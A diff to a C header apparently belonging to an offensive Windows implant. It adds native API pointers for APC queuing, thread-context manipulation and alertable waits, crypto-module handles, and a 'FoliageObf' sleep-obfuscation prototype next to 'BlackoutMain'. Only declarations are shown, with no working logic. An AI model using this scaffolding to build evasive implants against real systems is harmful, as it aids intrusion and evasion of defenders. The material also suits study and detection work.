@@ -62,6 +62,7 @@ typedef struct _INSTANCE {
         BOOL    (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
         BOOL    (WINAPI *VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
         DWORD   (WINAPI *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+        DWORD   (WINAPI *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
         HANDLE  (WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
         HANDLE  (WINAPI *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
         DWORD   (WINAPI *QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
@@ -87,9 +88,21 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtCreateThreadEx)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
         NTSTATUS (NTAPI *LdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
         NTSTATUS (NTAPI *NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-        
+        NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
+        NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
+        NTSTATUS (NTAPI *NtTestAlert)(void);
+        NTSTATUS (NTAPI *NtQueueApcThread)(HANDLE ThreadHandle, PPS_APC_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
+        NTSTATUS (NTAPI *NtGetContextThread)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
+        NTSTATUS (NTAPI *NtSetContextThread)( HANDLE ThreadHandle, PCONTEXT ThreadContext );
+        NTSTATUS (NTAPI *NtAlertResumeThread)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
+        NTSTATUS (NTAPI *NtCreateEvent)(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState);
+        NTSTATUS (NTAPI *NtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
+
         BOOL      (WINAPI *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
         NTSTATUS  (NTAPI *SystemFunction032)(struct USTRING* Img, struct USTRING* Key);
+
+        PVOID SystemFunction040;
+        PVOID SystemFunction041;
 
         HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
         HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
@@ -114,6 +127,8 @@ typedef struct _INSTANCE {
         PVOID Msvcrt;
         PVOID User32;
         PVOID Iphlpapi;
+        PVOID Cryptbase;
+        PVOID Cryptsp;
     } Modules;
 
     struct {
@@ -154,10 +169,10 @@ typedef struct _INSTANCE {
         } Session;
 
         struct {
-            PSTR  UserName;
-            PSTR  DomainName;
-            PSTR  ComputerName;
-            PSTR  NetBios;
+            CHAR  UserName[MAX_PATH];
+            CHAR  DomainName[MAX_PATH];
+            CHAR  ComputerName[MAX_PATH];
+            CHAR  NetBios[MAX_PATH];
             WORD  OsArch;
             DWORD OsMajorV;
             DWORD OsMinorv;
@@ -176,6 +191,14 @@ EXTERN_C PVOID StRipEnd();
 
 VOID BlackoutMain(
     _In_ PVOID Param
+);
+
+VOID FoliageObf( 
+    _In_ DWORD SleepTime
+);
+
+EXTERN_C VOID volatile ___chkstk_ms(
+        VOID
 );
 
 #endif //INSTANCE_COMMON_H
